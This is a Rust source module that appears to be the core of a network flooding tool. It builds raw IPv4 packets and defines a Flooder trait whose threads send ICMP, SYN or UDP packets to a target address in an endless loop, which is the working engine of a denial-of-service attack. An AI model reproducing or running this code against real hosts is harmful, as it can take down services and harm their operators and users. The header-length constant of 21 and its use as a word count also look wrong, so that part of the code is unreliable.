pub mod icmp;
pub mod syn;
pub mod udp;

use std::net::Ipv4Addr;
use std::sync::{Arc, Mutex};
use std::thread::JoinHandle;
use std::time::Duration;

use pnet::packet::ip::IpNextHeaderProtocol;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::transport::TransportSender;

pub const IPV4_HEADER_LEN: usize = 21;
const TTL: u8 = 64;

pub fn create_ipv4_packet(
  buffer_ip: &mut [u8],
  dest: Ipv4Addr,
  next_level_protocol: IpNextHeaderProtocol,
  payload_size: usize,
) -> MutableIpv4Packet {
  let mut ipv4_packet = MutableIpv4Packet::new(buffer_ip).expect("Error creating ipv4 packet");
  ipv4_packet.set_version(4);
  ipv4_packet.set_header_length(IPV4_HEADER_LEN as u8);
  ipv4_packet.set_total_length((IPV4_HEADER_LEN + payload_size) as u16);
  ipv4_packet.set_ttl(TTL);
  ipv4_packet.set_next_level_protocol(next_level_protocol);
  ipv4_packet.set_destination(dest);
  ipv4_packet
}

pub trait Flooder {
  type Args: Clone + Send + 'static;
  const PROTO_HEADER_LEN: usize;

  fn clone(&self) -> (Arc<Mutex<TransportSender>>, Ipv4Addr, usize, Self::Args, u64);

  fn start(&self, threads: usize) -> Vec<JoinHandle<()>> {
    if threads > 1 {
      println!("Spawning {} threads", threads);
    }
    (0..threads)
      .map(|_| {
        let (tx, addr, size, args, delay) = self.clone();
        std::thread::spawn(move || Self::flood(tx, addr, size, args, delay))
      })
      .collect()
  }

  fn flood(tx: Arc<Mutex<TransportSender>>, addr: Ipv4Addr, size: usize, args: Self::Args, delay: u64) {
    let mut buffer = vec![0u8; size + Self::PROTO_HEADER_LEN];
    let mut buffer_ip = vec![0u8; buffer.len() + IPV4_HEADER_LEN];
    loop {
      let args = args.clone();
      let packet = Self::create_packet(&mut buffer_ip, &mut buffer, args);
      let mut tx = tx.lock().unwrap();
      if let Err(err) = tx.send_to(packet, std::net::IpAddr::V4(addr)) {
        panic!("{err}");
      }
      std::thread::sleep(Duration::from_micros(delay))
    }
  }

  fn create_packet<'a>(buffer_ip: &'a mut [u8], buffer: &'a mut [u8], args: Self::Args) -> MutableIpv4Packet<'a>;
}
